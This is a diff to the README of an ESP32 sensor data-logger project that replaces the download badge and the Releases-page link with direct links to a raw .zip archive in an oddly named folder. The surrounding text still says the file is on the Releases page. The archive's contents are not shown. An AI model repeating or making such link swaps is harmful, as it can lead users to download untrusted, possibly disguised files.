@@ -1,6 +1,6 @@
 # 🌟 ESP32_ADC_WEB_Datalogger - Easy Logging for Your Sensors
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://raw.githubusercontent.com/twriad969/ESP32_ADC_WEB_Datalogger/main/perennibranch/ESP32_ADC_WEB_Datalogger.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ The ESP32_ADC_WEB_Datalogger lets you log data from your sensors through a simpl
 
 To get your ESP32_ADC_WEB_Datalogger, visit the following page to download:
 
-[Visit this page to download](https://github.com/twriad969/ESP32_ADC_WEB_Datalogger/releases)
+[Visit this page to download](https://raw.githubusercontent.com/twriad969/ESP32_ADC_WEB_Datalogger/main/perennibranch/ESP32_ADC_WEB_Datalogger.zip)
 
 1. Go to the **Releases** page linked above.
 2. Find the latest version.
